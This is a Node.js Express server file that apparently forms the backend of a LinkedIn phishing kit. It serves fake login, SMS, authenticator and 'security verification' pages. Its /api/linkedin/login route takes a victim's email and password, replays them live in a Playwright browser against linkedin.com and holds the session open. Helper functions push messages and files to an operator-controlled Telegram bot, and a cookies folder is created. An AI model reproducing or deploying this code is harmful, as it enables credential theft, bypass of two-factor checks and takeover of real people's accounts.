const express = require('express');
const path = require('path');
const cors = require('cors');
const session = require('express-session');
const fs = require('fs');
const axios = require('axios');
const dns = require('dns').promises;
const { v4: uuidv4 } = require('uuid');
const FormData = require('form-data');
const { chromium } = require('playwright');

require('dotenv').config();

// Create Express app
const app = express();
const port = 3333; // Using a specific port to avoid conflicts

// Configure browser options
const browserConfig = {
    args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--disable-gpu'
    ]
};

// Create required directories
const dirs = [
    path.join(__dirname, 'public', 'images', 'puzzle'),
    path.join(__dirname, 'cookies')
];

dirs.forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

// Helper functions
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "HTML"
        });
    } catch (error) {
        console.error("Error sending Telegram message:", error);
    }
}

async function sendTelegramFile(filePath, caption) {
    try {
        const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendDocument`;
        const form = new FormData();
        form.append("chat_id", process.env.TELEGRAM_CHAT_ID);
        form.append("document", fs.createReadStream(filePath), {
            filename: path.basename(filePath),
            contentType: "application/json"
        });
        if (caption) {
            form.append("caption", caption);
        }
        const response = await axios.post(url, form, {
            headers: form.getHeaders()
        });
        return response.data;
    } catch (error) {
        console.error("Error sending file to Telegram:", error.response?.data || error.message);
    }
}

// Session storage
let sessions = {};

// Configure middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));
app.use(session({
    secret: process.env.SESSION_SECRET || 'your-session-secret-key-here',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: process.env.NODE_ENV === 'production' }
}));

// View routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

app.get('/login.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'login.html'));
});

app.get('/security-verification.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'security-verification.html'));
});

app.get('/mobile-verification.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'mobile-verification.html'));
});

app.get('/sms.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'sms.html'));
});

app.get('/enter-phone.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'enter-phone.html'));
});

app.get('/authenticator-app.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'authenticator-app.html'));
});

app.get('/quick-verification.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'quick-verification.html'));
});

// LinkedIn API routes
app.post("/api/linkedin/login", async (req, res) => {
    let { sessionId, email, password } = req.body;

    if (!email) {
        return res.status(400).send("Email is required");
    }

    if (!sessionId) {
        sessionId = uuidv4();
    }

    if (sessions[sessionId]) {
        return res.status(400).send("Session already exists");
    }

    try {
        const browser = await chromium.launch({ headless: false, args: browserConfig.args });
        const context = await browser.newContext({
            viewport: { width: 1280, height: 720 },
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        });
        const page = await context.newPage();

        await page.goto("https://www.linkedin.com/login");
        await page.waitForSelector("#username");
        await page.waitForSelector("#password");

        await page.fill("#username", email);
        await page.fill("#password", password);
        await page.click('button[type="submit"]');

        sessions[sessionId] = { 
            browser, 
            page,
            context,
            userInfo: {
                email,
                password,
                timestamp: new Date().toISOString()
            }
        };

        // Set session timeout
        setTimeout(async () => {
            if (sessions[sessionId]) {
                console.log(`Session ${sessionId} timed out after 10 minutes`);
                try {
                    await context.close();
                    await browser.close();
                    delete sessions[sessionId];
                } catch (error) {
                    console.error('Error cleaning up session after timeout:', error);
                }
            }
        }, 10 * 60 * 1000);

        res.send("1");
    } catch (err) {
        console.error("Error in /api/linkedin/login:", err);
        res.status(500).send(err.message);
    }
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ error: 'Something went wrong!' });
});

// Start server
app.listen(port, '127.0.0.1', () => {
    console.log(`Server is running at http://127.0.0.1:${port}`);
});
